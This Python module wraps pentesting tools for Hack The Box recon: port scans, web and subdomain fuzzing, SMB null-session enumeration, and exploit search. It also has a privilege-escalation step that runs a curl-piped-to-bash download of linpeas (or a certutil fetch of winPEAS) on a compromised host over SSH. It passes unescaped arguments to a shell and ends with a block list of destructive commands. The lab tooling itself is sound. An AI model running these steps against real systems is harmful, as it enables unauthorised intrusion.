"""
CYBER-RAG Scanner
Wrappers for common pentesting tools + HTB-specific recon workflow
"""
import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Optional


def _sudo_prefix() -> str:
    """Return 'sudo ' if not already root, empty string if we are root."""
    return "" if os.geteuid() == 0 else "sudo "


# ── Tool availability ──────────────────────────────────────

TOOL_NAMES = [
    "nmap", "feroxbuster", "gobuster", "ffuf", "nikto", "whatweb",
    "searchsploit", "curl", "nc", "sqlmap", "hydra",
    "john", "hashcat", "enum4linux", "smbclient",
    "netexec", "wfuzz", "dirsearch", "sshpass",
]


def check_tools() -> dict[str, bool]:
    return {t: shutil.which(t) is not None for t in TOOL_NAMES}


# ── Command execution ──────────────────────────────────────

def run_command(cmd: str, timeout: int = 120, cwd: Optional[str] = None) -> dict:
    """Execute a shell command and return structured result."""
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=cwd,
        )
        return {
            "command": cmd,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
            "success": result.returncode == 0,
        }
    except subprocess.TimeoutExpired:
        return {
            "command": cmd,
            "stdout": "",
            "stderr": f"⏱ Command timed out after {timeout}s",
            "returncode": -1,
            "success": False,
        }
    except Exception as exc:
        return {
            "command": cmd,
            "stdout": "",
            "stderr": str(exc),
            "returncode": -1,
            "success": False,
        }


# ── HTB recon workflow ─────────────────────────────────────

def parse_grepable_ports(filepath: str) -> str:
    """Parse a grepable nmap file (-oG) and return comma-separated open ports.
    Mirrors what extractPorts does: grep for N/open, return sorted unique ports.
    """
    ports: list[int] = []
    try:
        with open(filepath) as f:
            for line in f:
                found = re.findall(r'(\d{1,5})/open', line)
                ports.extend(int(p) for p in found)
    except FileNotFoundError:
        return ""
    return ",".join(str(p) for p in sorted(set(ports)))


def htb_recon(machine_name: str, ip: str, work_dir: str) -> dict:
    """Full HTB recon workflow — skips steps whose output files already exist."""
    machine_dir = Path(work_dir).expanduser() / machine_name
    nmap_dir    = machine_dir / "nmap"
    allports    = nmap_dir / "allPorts"
    targeted    = nmap_dir / "targeted"

    # ── Step 1: mkt (always idempotent) ───────────────────
    for d in (nmap_dir, machine_dir / "content", machine_dir / "exploits"):
        d.mkdir(parents=True, exist_ok=True)

    lines: list[str] = [f"[*] Workspace: {machine_dir}", ""]

    # ── Return existing targeted scan if already present ───
    if targeted.exists() and targeted.stat().st_size > 0:
        targeted_out = targeted.read_text()
        ports = parse_grepable_ports(str(allports)) if allports.exists() else ""
        lines.append("[*] Existing scan files found — skipping re-scan.")
        lines.append(f"[*] Open ports (from allPorts): {ports or 'unknown'}")
        lines.append(f"\n[existing] {targeted}\n")
        lines.append(targeted_out[:8000] if len(targeted_out) > 8000 else targeted_out)
        return {
            "output": "\n".join(lines),
            "ports": ports,
            "machine_dir": str(machine_dir),
            "targeted": targeted_out,
            "from_cache": True,
        }

    # ── Step 2: Full port scan ─────────────────────────────
    if allports.exists() and allports.stat().st_size > 0:
        lines.append("[*] allPorts exists — skipping full port scan, re-using it.")
    else:
        cmd1 = f"{_sudo_prefix()}nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv {ip} -oG {allports}"
        lines.append(f"$ {cmd1}")
        r1 = run_command(cmd1, timeout=600, cwd=str(machine_dir))
        scan_out = (r1["stdout"] or r1["stderr"]).strip()
        lines.append(scan_out[:6000] if len(scan_out) > 6000 else scan_out)

    # ── Step 3: extractPorts ───────────────────────────────
    ep = run_command(
        f'zsh -c "source ~/.zshrc 2>/dev/null && extractPorts {allports}"',
        timeout=10,
        cwd=str(machine_dir),
    )
    lines.append(ep["stdout"].strip() if ep["stdout"].strip() else "[extractPorts ran silently]")

    ports = parse_grepable_ports(str(allports))
    if not ports:
        lines.append("\n[!] No open ports found — check if target is reachable or scan timed out.")
        return {"output": "\n".join(lines), "ports": "", "machine_dir": str(machine_dir), "targeted": ""}

    lines.append(f"\n[*] Open ports: {ports}")

    # ── Step 4: Targeted service scan ──────────────────────
    cmd2 = f"nmap -p{ports} -sCV {ip} -oN {targeted}"
    lines.append(f"\n$ {cmd2}")
    r2 = run_command(cmd2, timeout=300, cwd=str(machine_dir))
    targeted_out = (r2["stdout"] or r2["stderr"]).strip()
    lines.append(targeted_out[:8000] if len(targeted_out) > 8000 else targeted_out)

    return {
        "output": "\n".join(lines),
        "ports": ports,
        "machine_dir": str(machine_dir),
        "targeted": targeted_out,
        "from_cache": False,
    }


# ── /etc/hosts management ─────────────────────────────────

def add_hosts_entry(ip: str, hostnames: list[str]) -> dict:
    """Append hostname(s) to /etc/hosts, skipping any already present."""
    try:
        current = Path("/etc/hosts").read_text()
    except Exception:
        current = ""

    new = [h for h in hostnames if h not in current]
    if not new:
        return {
            "command": "", "returncode": 0, "success": True,
            "stdout": f"Already in /etc/hosts: {', '.join(hostnames)}", "stderr": "",
        }

    entry = f"{ip}\t{' '.join(new)}"
    try:
        import subprocess as _sp
        proc = _sp.run(
            ["sudo", "tee", "-a", "/etc/hosts"],
            input=f"\n{entry}\n",
            capture_output=True, text=True, timeout=10,
        )
        return {
            "command": f"echo '{entry}' | sudo tee -a /etc/hosts",
            "stdout": f"Added: {entry}" if proc.returncode == 0 else "",
            "stderr": proc.stderr,
            "returncode": proc.returncode,
            "success": proc.returncode == 0,
        }
    except Exception as exc:
        return {"command": "", "stdout": "", "stderr": str(exc), "returncode": -1, "success": False}


# ── Other scanners ─────────────────────────────────────────

def udp_scan(target: str, ports: str = "161,162,137,138,139,500") -> dict:
    return run_command(f"{_sudo_prefix()}nmap -sU -sV -p {ports} {target}", timeout=300)


def web_enum(url: str, wordlist: str = "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt") -> dict:
    if shutil.which("feroxbuster"):
        cmd = f"feroxbuster -u {url} -w {wordlist} -t 50 -q --no-state --depth 2"
    elif shutil.which("gobuster"):
        cmd = f"gobuster dir -u {url} -w {wordlist} -t 40 -q --no-error"
    elif shutil.which("ffuf"):
        cmd = f"ffuf -u {url}/FUZZ -w {wordlist} -mc 200,204,301,302,307,401,403 -s"
    elif shutil.which("dirsearch"):
        cmd = f"dirsearch -u {url} -w {wordlist} -q"
    else:
        return {
            "command": "", "stdout": "No web enum tool found (install feroxbuster/gobuster/ffuf/dirsearch)",
            "stderr": "", "returncode": -1, "success": False,
        }
    return run_command(cmd, timeout=300)


def subdomain_enum(domain: str, ip: Optional[str] = None, wordlist: str = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt") -> dict:
    if not shutil.which("wfuzz"):
        return {"command": "", "stdout": "wfuzz not installed", "stderr": "", "returncode": -1, "success": False}
    target = ip if ip else domain
    cmd = f'wfuzz -c -w {wordlist} -u "http://{target}/" -H "Host: FUZZ.{domain}" --hc 400,404,403 -t 50'
    return run_command(cmd, timeout=300)


def smb_enum(target: str) -> dict:
    if shutil.which("netexec"):
        # netexec is the modern replacement for enum4linux — null session + share enum + RID cycling
        r = run_command(f"netexec smb {target} -u '' -p '' --shares --users 2>/dev/null", timeout=60)
        if r["returncode"] == 0 or r["stdout"].strip():
            return r
    if shutil.which("enum4linux"):
        return run_command(f"enum4linux -a {target}", timeout=120)
    elif shutil.which("smbclient"):
        return run_command(f"smbclient -L //{target} -N", timeout=60)
    return {"command": "", "stdout": "No SMB enum tool found (install netexec/enum4linux/smbclient)", "stderr": "", "returncode": -1, "success": False}


def nikto_scan(url: str) -> dict:
    if not shutil.which("nikto"):
        return {"command": "", "stdout": "nikto not installed", "stderr": "", "returncode": -1, "success": False}
    return run_command(f"nikto -h {url} -maxtime 120 -nointeractive -Format txt", timeout=150)


def privesc_enum(target: str, username: str, password: str = "", os_type: str = "linux") -> dict:
    """Run linpeas (Linux) or winPEAS (Windows) on a compromised target via SSH."""
    ssh_opts = "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10"

    if os_type == "linux":
        run_cmd = "curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null"
    else:
        run_cmd = (
            "certutil -urlcache -f "
            "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe "
            "C:\\Windows\\Temp\\wp.exe && C:\\Windows\\Temp\\wp.exe"
        )

    if password:
        if not shutil.which("sshpass"):
            manual = (
                f"sshpass not found — run manually:\n"
                f"  scp linpeas.sh {username}@{target}:/tmp/\n"
                f"  ssh {username}@{target} 'chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'"
            )
            return {"command": manual, "stdout": manual, "stderr": "", "returncode": 0, "success": True}
        cmd = f"sshpass -p '{password}' ssh {ssh_opts} {username}@{target} '{run_cmd}'"
    else:
        cmd = f"ssh {ssh_opts} {username}@{target} '{run_cmd}'"

    return run_command(cmd, timeout=600)


def search_exploit(term: str) -> dict:
    if not shutil.which("searchsploit"):
        return {"command": "", "stdout": "searchsploit not installed", "stderr": "", "returncode": -1, "success": False}
    return run_command(f"searchsploit '{term}'", timeout=30)


def whatweb(url: str) -> dict:
    if not shutil.which("whatweb"):
        return run_command(f"curl -sI {url}", timeout=30)
    return run_command(f"whatweb -a 3 {url}", timeout=60)


def filter_findings(output: str, command: str = "") -> str:
    """Strip banner/progress noise from tool output, keeping only finding lines."""
    lines = output.splitlines()

    if "feroxbuster" in command:
        # Feroxbuster finding lines: "200  GET  123l  456w  ..."
        found = [l for l in lines if re.match(r'^\s*\d{3}\s+\w+', l)]
        return "\n".join(found) if found else output

    if "wfuzz" in command:
        # Wfuzz result lines: "000001234:   200  87 L  ..."
        found = [l for l in lines if re.match(r'^\d+:', l.strip())]
        return "\n".join(found) if found else output

    if "gobuster" in command:
        # Gobuster finding lines start with "/" or contain "(Status:"
        found = [l for l in lines if l.strip().startswith("/") or "(Status:" in l]
        return "\n".join(found) if found else output

    if "nikto" in command:
        # Nikto finding lines start with "+ "
        found = [l for l in lines if l.strip().startswith("+ ")]
        return "\n".join(found) if found else output

    return output


def format_result(result: dict, max_chars: int = 4000) -> str:
    """Format a command result for display / AI context."""
    cmd = result.get("command", "")
    out = result.get("stdout", "").strip()
    err = result.get("stderr", "").strip()
    combined = filter_findings(out or err or "(no output)", cmd)
    if len(combined) > max_chars:
        half = max_chars // 2
        combined = combined[:half] + f"\n\n[…{len(combined) - max_chars:,} chars omitted…]\n\n" + combined[-half:]
    return f"$ {cmd}\n{combined}"


# ── Dangerous command detection ────────────────────────────

DANGEROUS_PATTERNS = [
    "rm -rf", "mkfs", "dd if=", "> /dev/",
    ":(){ :", "chmod 777 /", "chown root",
    "iptables -F", "systemctl stop",
]


def is_dangerous(cmd: str) -> bool:
    return any(p in cmd for p in DANGEROUS_PATTERNS)
